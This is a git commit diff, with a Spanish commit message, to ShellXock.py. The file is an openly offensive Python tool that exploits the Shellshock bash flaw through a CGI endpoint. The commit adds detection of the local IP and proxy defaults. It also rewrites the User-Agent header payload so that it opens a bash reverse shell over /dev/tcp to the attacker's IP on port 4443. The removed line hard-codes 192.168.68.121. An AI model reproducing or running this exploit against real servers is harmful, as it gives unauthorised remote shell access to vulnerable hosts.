1664c84c8f38a1c3ca7c955f63e65c4238e6b306
B3XAL <114959034+B3XAL@users.noreply.github.com>
2023-09-20 17:51:52 +0200

    Update ShellXock.py
    Selección de ip de conexion local.
    Variable de proxy por defecto.

--- ShellXock.py
+++ ShellXock.py
@@ -4,6 +4,7 @@ import sys
 import signal
 import threading
 from pwn import *
+import socket
 
 # Colores
 greenColour = "\033[0;32m\033[1m"
@@ -39,6 +40,34 @@ while True:
     if main_url.strip():  # Verificar si se ingresó una dirección IP válida
         break
 
+# Obtener la dirección IP local
+def get_local_ip():
+    try:
+        # Crear un socket UDP
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.settimeout(0.1)
+        
+        # Conectarlo a un servidor externo (puede ser un servidor DNS)
+        s.connect(("8.8.8.8", 80))
+        
+        # Obtener la dirección IP local
+        local_ip = s.getsockname()[0]
+        
+        # Cerrar el socket
+        s.close()
+        
+        return local_ip
+    except Exception as e:
+        print("Error al obtener la dirección IP local:", e)
+        return None
+    
+# Obtener la dirección IP local o usar una por defecto
+default_local_ip = get_local_ip() or "xXxXx"
+iplocal = input(f"\n{blueColour}Ingresa la dirección IP local de conexión (Por defecto: {default_local_ip}): {endColour}").strip() or default_local_ip
+
+print(f"{greenColour}IP local seleccionada: {iplocal}{endColour}")
+
+
 # Menú para elegir el uso de proxy
 print("\n" + blueColour + "Elige si deseas usar un proxy:" + endColour)
 print(f"\n{purpleColour}1. Usar Proxy")
@@ -49,7 +78,8 @@ use_proxy_option = input("\n" + purpleColour + "Opción: " + endColour).strip()
 if use_proxy_option == '1':
     # Solicitar la dirección IP del proxy al usuario
     while True:
-        proxy_ip = input("\n" + blueColour + "Ingresa la dirección IP del proxy: " + endColour).strip()
+        proxy_ip = input(f"\n{blueColour}Ingresa la dirección IP del proxy (Por defecto: {main_url}): {endColour}").strip() or main_url
+
         if proxy_ip.strip():  # Verificar si se ingresó una dirección IP válida
             break
 
@@ -80,13 +110,15 @@ proxy = {'http': f'http://{proxy_ip}:{proxy_port}'} if proxy_ip else None
 
 # Función para ejecutar el ataque Shellshock a través de proxy o directamente
 def shellshock_proxy():
-    headers = { 'User-Agent' : "() { :;}; echo; echo; echo; echo; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.68.121/4443 0>&1'"}
-    try:
+   headers = { 'User-Agent' : f"() {{ :;}}; echo; echo; echo; echo; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/{iplocal}/4443 0>&1'"}
+
+   try:
         if proxy:
             r = requests.get(f"http://{main_url}/cgi-bin/{directory}/", headers=headers, proxies=proxy)
         else:
             r = requests.get(f"http://{main_url}/cgi-bin/{directory}/", headers=headers)
-    except Exception as e:
+
+   except Exception as e:
         log.error(str(e))
 
 if __name__ == '__main__':
